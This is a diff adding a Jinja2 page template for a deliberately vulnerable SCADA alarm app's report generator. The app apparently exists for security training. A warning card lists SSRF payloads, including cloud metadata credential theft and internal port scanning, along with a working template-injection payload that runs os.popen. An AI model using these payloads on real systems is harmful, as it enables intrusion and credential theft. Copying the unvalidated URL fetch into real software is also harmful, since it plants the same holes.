@@ -1,0 +1,113 @@
+{% extends "base.html" %}
+
+{% block title %}Reports - SCADA Alarm Management{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>Generate Report</h2>
+    
+    {% if error %}
+    <div class="alert alert-error">{{ error }}</div>
+    {% endif %}
+    
+    <form method="POST" action="{{ url_for('reports') }}">
+        <div class="form-group">
+            <label for="report_type">Report Type</label>
+            <select id="report_type" name="report_type" required>
+                <option value="summary">Alarm Summary</option>
+                <option value="detailed">Detailed Analysis</option>
+                <option value="compliance">Compliance Report</option>
+                <option value="performance">Performance Metrics</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <label for="data_source">External Data Source URL (Optional)</label>
+            <input type="url" id="data_source" name="data_source" 
+                   placeholder="https://api.example.com/sensor-data">
+            <small style="color: #666; display: block; margin-top: 0.5rem;">
+                Fetch additional data from external API for enrichment
+            </small>
+        </div>
+        
+        <div class="form-group">
+            <label for="template_url">Report Template URL (Required)</label>
+            <input type="url" id="template_url" name="template_url" 
+                   placeholder="https://example.com/templates/report.html" required>
+            <small style="color: #666; display: block; margin-top: 0.5rem;">
+                URL to Jinja2 template for report generation
+            </small>
+        </div>
+        
+        <button type="submit" class="btn btn-primary">Generate Report</button>
+    </form>
+</div>
+
+<div class="card" style="background: #fff3cd; border: 2px solid #ffc107;">
+    <h3 style="color: #856404;">⚠️ VULNERABILITY DEMONSTRATION</h3>
+    <p style="color: #856404; margin-top: 1rem;">
+        <strong>SSRF + Template Injection:</strong> This endpoint fetches external URLs without validation 
+        and executes Jinja2 templates without sandboxing.
+    </p>
+    
+    <details style="margin-top: 1rem;">
+        <summary style="cursor: pointer; color: #667eea; font-weight: bold;">Show Attack Scenarios</summary>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 1: Internal Service Scan</h4>
+            <p style="margin-bottom: 0.5rem;">Data Source URL: <code>http://localhost:8080/admin</code></p>
+            <p style="color: #666; font-size: 0.9rem;">Access internal services not exposed to the internet</p>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 2: Cloud Metadata Theft</h4>
+            <p style="margin-bottom: 0.5rem;">Data Source URL: <code>http://169.254.169.254/latest/meta-data/</code></p>
+            <p style="color: #666; font-size: 0.9rem;">Steal AWS/Azure credentials from metadata service</p>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 3: Remote Code Execution via Template</h4>
+            <p style="margin-bottom: 0.5rem;">Create a malicious template file:</p>
+            <pre style="background: white; padding: 0.5rem; border-radius: 3px; overflow-x: auto;">
+{{ '{{' }} ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() {{ '}}' }}
+            </pre>
+            <p style="color: #666; font-size: 0.9rem; margin-top: 0.5rem;">
+                Host it on your server and use it as Template URL to execute commands
+            </p>
+        </div>
+        
+        <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px; margin-top: 1rem;">
+            <h4 style="color: #667eea; margin-bottom: 0.5rem;">Attack 4: Port Scanning</h4>
+            <p style="margin-bottom: 0.5rem;">Data Source URL: <code>http://internal-server:22</code></p>
+            <p style="color: #666; font-size: 0.9rem;">Scan internal network ports by observing response times</p>
+        </div>
+    </details>
+</div>
+
+<div class="card">
+    <h2>Sample Templates</h2>
+    <p style="color: #666; margin-bottom: 1rem;">Use these legitimate template examples:</p>
+    
+    <div style="background: #f8f9fa; padding: 1rem; border-radius: 5px;">
+        <h4>Basic Report Template:</h4>
+        <pre style="background: white; padding: 1rem; border-radius: 3px; overflow-x: auto; margin-top: 0.5rem;">
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;SCADA Alarm Report&lt;/h1&gt;
+    &lt;p&gt;Generated: {{ '{{' }} generated_at {{ '}}' }}&lt;/p&gt;
+    &lt;p&gt;By: {{ '{{' }} generated_by {{ '}}' }}&lt;/p&gt;
+    
+    &lt;h2&gt;Alarms&lt;/h2&gt;
+    {{ '{%' }} for alarm in alarms {{ '%}' }}
+    &lt;div&gt;
+        &lt;strong&gt;{{ '{{' }} alarm.alarm_code {{ '}}' }}&lt;/strong&gt; - 
+        {{ '{{' }} alarm.severity {{ '}}' }} - 
+        {{ '{{' }} alarm.description {{ '}}' }}
+    &lt;/div&gt;
+    {{ '{%' }} endfor {{ '%}' }}
+&lt;/body&gt;
+&lt;/html&gt;
+        </pre>
+    </div>
+</div>
+{% endblock %}
